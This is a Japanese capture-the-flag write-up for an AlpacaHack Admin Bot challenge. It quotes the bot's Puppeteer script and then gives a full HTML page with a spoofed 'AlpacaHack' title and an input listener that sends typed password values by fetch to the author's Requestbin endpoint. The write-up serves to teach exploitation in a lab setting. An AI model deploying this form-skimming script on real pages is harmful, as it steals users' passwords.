# Look like AlpacaHack

## / Overview

addEventListenerを使ったパスワード窃盗

この Admin Bot のチャレンジでは、こちらが指定したWebサイトにBotがアクセスします。その後、`bot.js`に書かれている以下の動作を行います。

```js
const page = await browser.newPage();
await page.goto(url, { timeout: 5000, waitUntil: "domcontentloaded" });

// Checks "AlpacaHack" occurs in <title> tag.
const title = await page.title();
if (!title.includes("AlpacaHack")) {
    await page.close();
    return;
}

// Input username and password
await page.type("input[name=email]", "alpaca@example.com");
await page.type("input[name=password]", FLAG);

await sleep(5000);
await page.close();
```

`bot.js`の内容から、ページのタイトルは`AlpacaHack`という文字列を含んでいる必要があります。この点に気をつけながら、`<input name='password'/>`に書き込まれたフラグを外部送信する方法を考えます。

## / Writeup



まず`addEventListener`でフラグが入力されたタイミングをフックに設定します。

このデータを送信する先として、HTMLを編集しているのと同じRequestbinのURLを指定することができるので、クエリストリングとしてフラグをURLに結合します。

これを`fetch`で送信することでフラグを得ることができます。

```html
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>AlpacaHack</title>
  </head>
  <body>
    <h1>Hello from Requestbin</h1>
    <input name="email"/>
    <input name="password"/>
    <script>
      document.querySelector('input[name="password"]')
      .addEventListener('input', (e) => {
          fetch(
              './?flag='+encodeURIComponent(e.target.value)
          );
      });
    </script>
  </body>
</html>
```